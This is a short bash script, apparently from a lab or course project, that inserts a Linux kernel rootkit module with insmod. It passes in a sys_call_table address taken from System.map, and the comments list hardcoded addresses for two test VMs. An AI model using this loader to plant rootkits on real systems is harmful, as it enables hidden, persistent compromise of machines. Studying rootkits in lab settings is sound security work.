#!/bin/bash

#Find the sys_call_table symbol's address from the /boot/System.map
#TABLE_ADDR=ffffffff820013c0 # Address for local 5.8.14 VM
TABLE_ADDR=ffffffff81801320 # Address for openstack 3.2 VM

#Sync for safety
sync

#Insert the rootkit module, providing some parameters
insmod rootkit.ko table_addr=0x$TABLE_ADDR
